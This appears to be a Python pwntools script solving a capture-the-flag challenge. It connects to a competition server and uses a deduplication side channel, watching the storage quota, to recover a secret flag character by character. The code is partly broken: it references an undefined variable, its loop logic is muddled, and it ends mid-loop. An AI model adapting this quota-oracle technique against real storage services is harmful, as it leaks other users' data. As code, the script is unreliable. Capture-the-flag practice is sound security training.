from pwn import *
import string
import re
from itertools import permutations

result = ''

conn = remote('filestore.2021.ctfcompetition.com', 1337)
conn.recv()
conn.recv()
conn.send('status\r\n')

received = conn.recvuntil('Menu').decode()
match = received.split("Quota:")[1].split("kB")[0]

print(str(match))
conn.close()

validChars = ['c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '0', '1', '3', '4', '{', '_', '}']
flag = ""
ARRAY_LENGTH = 20

#we can figure a flag ends in }, so lets start there.
for char in validChars:

    """
    for every different 2 char variation if size does not increase the string tested
    is already stored in the bytearray (deduplication)
    

    we can figure a flag ends in }, so lets start there.
    """
    cnt = 1

    for x in reversed(validChars):           
        print(x)

        for y in reversed(validChars):   
            print(y+flag)
            conn = remote('filestore.2021.ctfcompetition.com', 1337)
            conn.recv()
            conn.send('store\r\n')
            conn.recv()
            conn.send(y+flag+'\r\n')
            conn.recvuntil('Menu')
            conn.send('status\r\n')
            received = conn.recvuntil('Menu').decode()
            quota = received.split("Quota:")[1].split("kB")[0]
            conn.close()
            if (quota == match):
                print("we got something:"+ y+x)
                flag = y + flag
                print(valid)

        
